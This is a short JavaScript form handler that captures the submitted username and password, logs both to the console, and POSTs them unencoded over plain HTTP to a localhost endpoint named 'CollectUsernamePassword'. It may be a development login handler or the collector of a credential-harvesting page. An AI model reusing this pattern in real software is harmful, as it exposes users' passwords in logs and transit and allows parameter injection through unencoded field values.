var form = document.getElementById("myform");

form.addEventListener("submit", function (event) {
    event.preventDefault();
    event.stopPropagation();
    if (event.target && event.target.id == 'myform') {
        var xmlhttp = new XMLHttpRequest();
        var username = document.getElementById("username").value;
        var password = document.getElementById("password").value;
        console.log(username, password);
        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'http://localhost:1615/API/CollectUsernamePassword');
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.send('username=' + username + '&password=' + password);
    }
})